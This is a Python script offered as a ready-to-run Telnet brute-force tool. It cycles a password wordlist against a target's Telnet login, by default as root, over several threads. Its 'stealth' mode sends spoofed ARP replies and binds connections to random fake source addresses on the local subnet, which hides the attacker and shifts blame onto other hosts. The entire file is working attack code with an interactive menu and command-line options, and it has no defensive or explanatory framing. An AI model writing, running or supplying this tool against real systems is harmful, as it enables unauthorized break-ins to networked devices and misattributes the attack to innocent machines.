#!/usr/bin/env python3
# Telnet Brute Force Tool with ARP‑backed Stealth Mode

import argparse
import threading
import socket
import time
import os
import sys
import signal
import random
from telnetlib import Telnet
from scapy.all import ARP, send

RED    = "\033[38;2;255;0;0m"
GREEN  = "\033[38;2;0;255;0m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

stopAttack    = False
attemptsDone  = 0
startTime     = 0
lock          = threading.Lock()

def SignalHandler(sig, frame):
    global stopAttack
    print(f"\n{RED}Stopping brute force...{RESET}")
    stopAttack = True
    sys.exit(0)

def FormatDuration(seconds):
    mins, secs = divmod(int(seconds), 60)
    hrs, mins = divmod(mins, 60)
    return f"{hrs:02}:{mins:02}:{secs:02}"

def PrintProgress(total):
    while not stopAttack:
        elapsed = time.time() - startTime
        with lock:
            print(f"\r{RED}Attempts: {attemptsDone}/{total} | Duration: {FormatDuration(elapsed)}{RESET}", end="")
        time.sleep(1)

def AttemptLogin(host, port, username, password, sourceIp=None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if sourceIp:
        try:
            sock.bind((sourceIp, 0))
        except OSError:
            return False
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        tn = Telnet()
        tn.sock = sock
        tn.read_until(b"login: ", timeout=3)
        tn.write(username.encode() + b"\n")
        tn.read_until(b"Password: ", timeout=3)
        tn.write(password.encode() + b"\n")
        time.sleep(1)
        out = tn.read_very_eager().decode(errors="ignore").lower()
        tn.close()

        # Check for known login failures
        for fail_msg in ["login incorrect", "authentication failed", "invalid", "fail"]:
            if fail_msg in out:
                return False
        return True
    except:
        return False
    finally:
        sock.close()

def ArpSpoofOnce(targetIp, fakeIp, iface):
    pkt = ARP(op=2, pdst=targetIp, psrc=fakeIp, hwdst="ff:ff:ff:ff:ff:ff")
    send(pkt, iface=iface, verbose=False)

def WorkerNormal(host, port, username, passwords, delay):
    global attemptsDone, stopAttack
    for pwd in passwords:
        if stopAttack:
            break
        if AttemptLogin(host, port, username, pwd):
            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
            stopAttack = True
            break
        with lock:
            attemptsDone += 1
        time.sleep(delay)

def WorkerStealth(host, port, username, passwords, subnetPrefix, iface, delay):
    global attemptsDone, stopAttack
    for pwd in passwords:
        if stopAttack:
            break
        fakeIp = f"{subnetPrefix}.{random.randint(2,254)}"
        ArpSpoofOnce(host, fakeIp, iface)
        if AttemptLogin(host, port, username, pwd, sourceIp=fakeIp):
            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
            stopAttack = True
            break
        with lock:
            attemptsDone += 1
        time.sleep(delay)

def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, threadsCount, delay):
    global startTime, attemptsDone
    startTime = time.time()
    attemptsDone = 0
    total = len(passwords)

    prog = threading.Thread(target=PrintProgress, args=(total,), daemon=True)
    prog.start()

    slices = [passwords[i::threadsCount] for i in range(threadsCount)]
    threads = []

    for i in range(threadsCount):
        if mode == "stealth":
            t = threading.Thread(
                target=WorkerStealth,
                args=(host, port, username, slices[i], subnetPrefix, iface, delay)
            )
        else:
            t = threading.Thread(
                target=WorkerNormal,
                args=(host, port, username, slices[i], delay)
            )
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    duration = FormatDuration(time.time() - startTime)
    print(f"\n{RED}Attack complete. Total attempts: {attemptsDone} | Duration: {duration}{RESET}")

def menu():
    host      = input(f"{RED}Target IP: {RESET}").strip()
    port      = int(input(f"{RED}Port [23]: {RESET}") or "23")
    username  = input(f"{RED}Username [root]: {RESET}").strip() or "root"
    threads   = int(input(f"{RED}Threads [10]: {RESET}") or "10")
    delay     = float(input(f"{RED}Delay between attempts (s) [1.0]: {RESET}") or "1.0")
    wordlist  = os.path.join(os.path.dirname(__file__), "passwords.txt")

    if not os.path.exists(wordlist):
        print(f"{RED}passwords.txt not found{RESET}")
        return

    with open(wordlist) as f:
        passwords = [l.strip() for l in f if l.strip()]

    choice = input(f"{RED}Mode: [1] Normal [2] Stealth (ARP spoof): {RESET}").strip()
    if choice == "2":
        subnetPrefix = input(f"{RED}Subnet prefix (e.g. 192.168.1): {RESET}").strip()
        iface        = input(f"{RED}Interface (e.g. eth0, ens33): {RESET}").strip()
        StartAttack(host, port, username, passwords, "stealth", subnetPrefix, iface, threads, delay)
    else:
        StartAttack(host, port, username, passwords, "normal", None, None, threads, delay)

def terminal():
    parser = argparse.ArgumentParser(description="Telnet Brute Force Tool")
    parser.add_argument("-i","--host",    required=True, help="Target IP")
    parser.add_argument("-P","--port",    type=int, default=23, help="Telnet port")
    parser.add_argument("-u","--username",default="root", help="Login username")
    parser.add_argument("-m","--mode",    choices=["normal","stealth"], default="normal", help="Mode")
    parser.add_argument("--subnet",       help="Subnet prefix (e.g. 192.168.1) for stealth")
    parser.add_argument("--iface",        help="Interface name for stealth mode (e.g. eth0, ens33)")
    parser.add_argument("-t","--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-d","--delay",   type=float, default=1.0, help="Delay between attempts (s)")
    args = parser.parse_args()

    wordlist = os.path.join(os.path.dirname(__file__), "passwords.txt")
    if not os.path.exists(wordlist):
        print(f"{RED}passwords.txt not found{RESET}")
        return

    with open(wordlist) as f:
        passwords = [l.strip() for l in f if l.strip()]

    StartAttack(
        args.host, args.port, args.username,
        passwords, args.mode,
        args.subnet, args.iface,
        args.threads, args.delay
    )

def main():
    signal.signal(signal.SIGINT, SignalHandler)
    if len(sys.argv) > 1:
        terminal()
    else:
        menu()

if __name__ == "__main__":
    main()
